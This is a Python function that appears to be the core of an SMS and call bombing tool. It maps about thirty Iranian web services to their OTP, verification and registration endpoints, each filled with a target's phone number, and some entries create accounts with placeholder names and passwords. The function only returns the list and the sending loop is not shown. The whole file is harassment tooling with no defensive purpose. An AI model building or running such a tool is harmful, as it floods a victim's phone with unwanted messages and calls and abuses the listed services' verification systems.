def send_otp_requests(number):
    url_payload_map = {
        'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
        'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
        'buskool': ('https://www.buskool.com/send_verification_code', {'phone': '0' + number}),
        'torob': ('https://api.torob.com/v4/user/phone/send-pin', {'phone_number': '0' + number}),
        'drdr': ('https://drdr.ir/api/registerEnrollment/verifyMobile', {'phoneNumber': '0' + number, 'userType': 'PATIENT'}),
        'itoll': ('https://app.itoll.ir/api/v1/auth/login', {'mobile': '0' + number}),
        'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
        'gap': ('https://core.gap.im/v1/user/add.json', {'mobile': '+98' + number}),
        'caropex': ('https://caropex.com/api/v1/user/login', {'mobile': '0' + number}),
        'hamrahsport': ('https://hamrahsport.com/send-otp', {'cell': number, 'name': 'persian_string', 'agree': '1', 'send_otp': '1', 'otp': ''}),
        'harikashop': ('https://harikashop.com/login?back=my-account', {
            'username': '0' + number,
            'id_customer': '',
            'back': ['', 'https://harikashop.com/login?back=my-account'],
            'firstname': 'persian_string',
            'lastname': 'persian_string',
            'password': 'random_password',
            'action': 'register',
            'ajax': '1'
        }),
        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {'action': 'stm_login_register', 'type': 'mobile', 'input': '0' + number}),
        'zzzagros': ('https://www.zzzagros.com/wp-admin/admin-ajax.php', {
            'action': 'ywp_ajax_register',
            'ywp_register': '1',
            'ywp_reg_mobile': '0' + number,
            'ywp_reg_password': 'random_password',
            'ajax_woocommerce_register_nonce': ''
        }),
        'basalam': ('https://auth.basalam.com/otp-request', {'mobile': '0' + number}),
        'arastag': ('https://arastag.ir/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': '0' + number}),
        'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': '0' + number}),
        'fankala': ('https://fankala.com/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'khanoumi': ('https://www.khanoumi.com/accounts/sendotp', {'mobile': '0' + number, 'redirectUrl': ''}),
        'dalfak': ('https://www.dalfak.com/api/auth/sendVerificationCode', {
            'type': 1,
            'value': '0' + number
        }),
        'filmnet': (f'https://filmnet.ir/api-v2/access-token/users/0{number}/otp', None),
        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': '+98' + number}),
        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number}),
        'doctoreto': ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', {
            'country_id': 205,
            'mobile': number
        }),
        'digikalacall': ('https://api.digikala.com/v1/user/authenticate/', {
            'backUrl': '/',
            'username': '0' + number,
            'otp_call': 'true'
        }),
        'okala': ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', {
            'mobile': '0'+number,
            'deviceTypeCode' :0,
            'confirmTerms': 'true',
            'notRobot': 'false',
        }),
        'digikala': ('https://api.digikala.com/v1/user/authenticate/', {
            'backUrl': '/',
            'username': '0'+number,
            'otp_call': 'false'
        }),
        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0'+number
        }),
    }

    return list(url_payload_map.values())
